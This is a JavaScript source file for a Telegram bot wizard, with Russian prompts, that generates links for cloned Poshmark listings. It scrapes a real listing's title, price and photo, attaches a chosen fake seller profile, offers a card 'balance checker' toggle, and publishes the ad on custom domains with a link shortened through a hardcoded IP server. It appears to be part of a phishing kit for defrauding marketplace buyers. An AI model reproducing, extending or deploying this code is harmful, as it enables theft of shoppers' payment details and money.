const WizardScene = require("telegraf/scenes/wizard");
const { Request, Ad, Service, Profiles, MyDomains } = require("../../database");
const locale = require("../../locale");
const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const log = require("../../helpers/log");
const cheerio = require("cheerio");
const { default: axios } = require("axios");
const rand = require("../../helpers/rand");
const myAd = require("../../commands/myAd");
const downloadImage = require("../../helpers/downloadImage");

const poshmark_eu_domains = ["www.poshmark.com", "poshmark.com"];

const scene = new WizardScene(
  "create_link_poshmark_eu",
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "poshmark_eu",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      ctx.wizard.state.code = ctx.match[1];
      log(ctx, "перешёл к созданию ссылки poshmark.com");
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene.reply("Выбери способ генерации ссылки:", {
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton("Ручной", "default"),
            Markup.callbackButton("Парсер", "parser"),
          ],
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      ctx.scene.state.data = {};
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      // Проверяем, что пользователь нажал на кнопку, а не написал текст
      if (!ctx.callbackQuery) {
        await ctx.scene
          .reply("❌ Пожалуйста, выбери способ генерации ссылки:", {
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.callbackButton("Ручной", "default"),
                Markup.callbackButton("Парсер", "parser"),
              ],
              [Markup.callbackButton("Отменить", "cancel")],
            ]),
          })
          .catch(() => {});
        return; // остаёмся на этом шаге
      }

      ctx.wizard.state.typeCreate = ctx.callbackQuery.data;

      if (ctx.callbackQuery.data === "parser") {
        await ctx.scene.reply("Отправьте ссылку на объявление poshmark.com", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        });
      } else {
        await ctx.scene.reply("Введите название объявления", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        });
      }

      ctx.scene.state.data = {};
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (ctx.wizard.state.typeCreate == "parser") {
        if (!ctx.message?.text) {
          await ctx.scene
            .reply("❌ Введите ссылку на объявление poshmark.com", {
              reply_markup: Markup.inlineKeyboard([
                [Markup.callbackButton("Отменить", "cancel")],
              ]),
            })
            .catch((err) => err);
          return;
        }

        let url;
        try {
          url = new URL(ctx.message.text);
        } catch (err) {
          await ctx.scene
            .reply("❌ Введите валидную ссылку", {
              reply_markup: Markup.inlineKeyboard([
                [Markup.callbackButton("Отменить", "cancel")],
              ]),
            })
            .catch((err) => err);
          return;
        }

        if (!poshmark_eu_domains.includes(url.host)) {
          await ctx.scene
            .reply("❌ Введите ссылку на объявление poshmark.com", {
              reply_markup: Markup.inlineKeyboard([
                [Markup.callbackButton("Отменить", "cancel")],
              ]),
            })
            .catch((err) => err);
          return;
        }

        log(ctx, `отправил ссылку для парсинга poshmark.com (${url.href})`);

        await ctx.scene.reply("🔄 Парсим объявление...").catch((err) => err);
        const ad = await axios.get(encodeURI(url.href)),
          $ = cheerio.load(ad.data);

        const info = {
          title:
            $('[property="og:title"]').first().attr("content") ||
            "No title found",
          price: null, // Placeholder for price
          adLink: url.href || "No URL found",
        };

        // Extracting the price
        const priceElement = $(".listing__ipad-centered .h1").first();
        if (priceElement.length) {
          const priceText = priceElement
            .clone()
            .children()
            .remove()
            .end()
            .text()
            .trim();
          info.price = priceText || "No price found";
        } else {
          info.price = "No price found";
        }

        try {
          info.photo = $('[property="og:image"]').first().attr("content");
        } catch (err) {
          info.photo = "No image found";
        }
        console.log(info);

        if (!info.title || !info.price) {
          await ctx.scene
            .reply("❌ Не удалось спарсить объявление")
            .catch((err) => err);
          return ctx.scene.leave();
        }
        log(ctx, `спарсил объявление poshmark.com (${url.href})`);
        ctx.scene.state.data = info;

        const profiles = await Profiles.findAll({
          where: { userId: ctx.from.id },
        });

        var buttons = profiles.map((v) => [
          Markup.callbackButton(v.title, v.id),
        ]);

        await ctx.scene.reply(`Выберите профиль`, {
          reply_markup: Markup.inlineKeyboard([
            ...buttons,
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        });
      } else {
        ctx.scene.state.data.title = escapeHTML(ctx.message.text);

        const service = await Service.findOne({
          where: {
            code: ctx.wizard.state.code,
          },
        });
        await ctx.scene
          .reply(
            `Введите цену объявления (только число, в ${service.currencyCode})`,
            {
              reply_markup: Markup.inlineKeyboard([
                [Markup.callbackButton("Отменить", "cancel")],
              ]),
            }
          )
          .catch((err) => err);
      }
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (ctx.wizard.state.typeCreate == "parser") {
        const profiles = await Profiles.findOne({
          where: { id: ctx.callbackQuery.data },
        });

        ctx.scene.state.data.address = profiles.address;
        ctx.scene.state.data.name = profiles.name;
        ctx.scene.state.data.phone = profiles.phone;

        await ctx.scene
          .reply("Чекер баланса", {
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.callbackButton("Включить", "true"),
                Markup.callbackButton("Выключить", "false"),
              ],
              [Markup.callbackButton("Отменить", "cancel")],
            ]),
          })
          .catch((err) => err);
      } else {
        var amount = parseFloat(ctx.message?.text);
        if (isNaN(amount) || ctx.message?.text.trim() === "")
          return ctx.wizard.prevStep(); // Добавлено условие, чтобы пустая строка не проходила
        if (amount % 1 == 0) amount = amount.toFixed(0);
        else amount = amount.toFixed(2);

        amount = "$" + amount;

        ctx.scene.state.data.price = amount;

        const profiles = await Profiles.findAll({
          where: { userId: ctx.from.id },
        });

        var buttons = profiles.map((v) => [
          Markup.callbackButton(v.title, v.id),
        ]);

        await ctx.scene.reply(`Выберите профиль`, {
          reply_markup: Markup.inlineKeyboard([
            ...buttons,
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        });
      }
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (ctx.wizard.state.typeCreate == "parser") {
        if (!["true", "false"].includes(ctx.callbackQuery?.data))
          return ctx.wizard.prevStep();
        ctx.scene.state.data.balanceChecker = ctx.callbackQuery.data == "true";

        const service = await Service.findOne({
          where: {
            code: "poshmark_eu",
          },
        });
        if (!service) {
          await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
          return ctx.scene.leave();
        }

        const ad = await Ad.create({
          id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
          userId: ctx.from.id,
          ...ctx.scene.state.data,
          serviceCode: "poshmark_eu",
        });
        const domains = await MyDomains.findOne({
          where: { userId: ctx.from.id },
        });

        let reductionUrl;

        try {
          const reduction = await axios.post(
            "http://185.208.158.144/api/create",
            {
              target: `https://${service.domain}/${ad.id}`,
              domain: service.shortlink || ctx.state.bot.shortlink,
            },
            { timeout: 2000 }
          );

          reductionUrl = reduction.data.url;
        } catch (error) {
          console.error(
            "Ошибка при создании сокращенной ссылки:",
            error.message
          );

          if (error.code === "ECONNABORTED") {
            console.warn("Запрос превысил допустимый тайм-аут.");
          } else if (
            error.code === "ECONNREFUSED" ||
            error.code === "ENOTFOUND"
          ) {
            console.warn("Сервер сокращений недоступен.");
          } else {
            console.warn("Произошла непредвиденная ошибка:", error.message);
          }

          reductionUrl = null; // корректный fallback
        }

        const personalDomainLink = domains
          ? `https://${domains.domain}/${ad.id}`
          : null;

        await ad.update({
          myDomainLink: personalDomainLink,
          shortLink: reductionUrl, // используем переменную
        });

        log(
          ctx,
          `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`
        );

        // Собираем сообщение
        try {
          await myAd(ctx, ad.id);
        } catch (err) {
          await ctx
            .replyOrEdit("❌ Ошибка при отображении объявления.")
            .catch(() => {});
        }

        ctx.updateType = "message";

        return ctx.scene.leave();
      } else {
        const profiles = await Profiles.findOne({
          where: { id: ctx.callbackQuery.data },
        });

        ctx.scene.state.data.address = profiles.address;
        ctx.scene.state.data.name = profiles.name;
        ctx.scene.state.data.phone = profiles.phone;

        await ctx.scene
          .reply("Отправьте изображение в сжатом формате", {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("Пропустить", "skip")],
              [Markup.callbackButton("Отменить", "cancel")],
            ]),
          })
          .catch((err) => err);
        return ctx.wizard.next();
      }
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
    }
    return ctx.scene.leave();
  },
  async (ctx) => {
    try {
      if (ctx.message?.photo?.length < 1 && ctx.callbackQuery?.data !== "skip")
        return ctx.reply("Ошибка");
      if (!ctx.callbackQuery) {
        const photo_link = await ctx.telegram.getFileLink(
          ctx.message.photo[1].file_id
        );
        ctx.wizard.state.data.photo = await downloadImage(photo_link);
      } else {
        ctx.wizard.state.data.photo = null;
      }

      await ctx.scene
        .reply("Чекер баланса", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("Включить", "true"),
              Markup.callbackButton("Выключить", "false"),
            ],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!["true", "false"].includes(ctx.callbackQuery?.data))
        return ctx.wizard.prevStep();
      ctx.scene.state.data.balanceChecker = ctx.callbackQuery.data == "true";

      const service = await Service.findOne({
        where: {
          code: ctx.wizard.state.code,
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }

      const ad = await Ad.create({
        id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
        userId: ctx.from.id,
        ...ctx.scene.state.data,
        serviceCode: "poshmark_eu",
      });
      const domains = await MyDomains.findOne({
        where: { userId: ctx.from.id },
      });

      let reductionUrl;

      try {
        const reduction = await axios.post(
          "http://185.208.158.144/api/create",
          {
            target: `https://${service.domain}/${ad.id}`,
            domain: service.shortlink || ctx.state.bot.shortlink,
          },
          { timeout: 2000 }
        );

        reductionUrl = reduction.data.url;
      } catch (error) {
        console.error("Ошибка при создании сокращенной ссылки:", error.message);

        if (error.code === "ECONNABORTED") {
          console.warn("Запрос превысил допустимый тайм-аут.");
        } else if (
          error.code === "ECONNREFUSED" ||
          error.code === "ENOTFOUND"
        ) {
          console.warn("Сервер сокращений недоступен.");
        } else {
          console.warn("Произошла непредвиденная ошибка:", error.message);
        }

        reductionUrl = null; // корректный fallback
      }

      const personalDomainLink = domains
        ? `https://${domains.domain}/${ad.id}`
        : null;

      await ad.update({
        myDomainLink: personalDomainLink,
        shortLink: reductionUrl, // используем переменную
      });

      log(
        ctx,
        `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`
      );

      // Собираем сообщение
      try {
        await myAd(ctx, ad.id);
      } catch (err) {
        await ctx
          .replyOrEdit("❌ Ошибка при отображении объявления.")
          .catch(() => {});
      }
      ctx.updateType = "message";
      return ctx.scene.leave();
    } catch (err) {
      console.log(err);
    }
  }
);

module.exports = scene;
